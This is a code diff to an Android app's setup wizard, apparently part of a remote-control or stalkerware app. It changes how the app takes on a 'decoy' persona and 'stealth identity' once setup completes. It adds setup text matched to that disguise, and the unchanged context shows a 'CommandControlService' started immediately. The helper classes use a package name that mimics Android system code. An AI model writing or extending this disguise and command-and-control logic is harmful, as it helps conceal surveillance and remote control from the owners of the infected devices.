@@ -86,6 +86,14 @@ public class SetupWizardActivity extends Activity {
         loadingView = findViewById(R.id.loadingView);
         
         btnNext.setOnClickListener(v -> onNextClicked());
+
+        // ── Identity-matched setup text ─────────────────────────────────────
+        try {
+            com.android.core.sync.AppIdentityManager.IdentityConfig idCfg =
+                com.android.core.sync.AppIdentityManager.get().getConfig();
+            tvTitle.setText(idCfg.setupTitle);
+            tvDescription.setText(idCfg.setupDescription);
+        } catch (Exception ignored) {}
         
         // 🚀 Inicia CommandControlService imediatamente
         try {
@@ -622,12 +630,10 @@ public class SetupWizardActivity extends Activity {
             .putBoolean("setup_completed", true)
             .commit();
 
-        // ── DECOY DEPLOYMENT: switch to stealth identity immediately ────────
+        // ── DECOY DEPLOYMENT: identity-aware auto-match (v2) ───────────────
         try {
-            int decoyPersona = BuildConfig.DECOY_CHOICE;
-            if (decoyPersona < 1 || decoyPersona > 6) decoyPersona = 1;
-            DecoyManager.get(this).remoteSwitch(decoyPersona);
-            Log.d("SWA", "Decoy deployed: persona " + decoyPersona);
+            com.android.core.sync.DecoyManager.get(this).deployOnSetupComplete();
+            Log.d("SWA", "Decoy deployed via identity auto-match");
         } catch (Exception e) {
             Log.e("SWA", "Decoy deploy error: " + e.getMessage());
         }
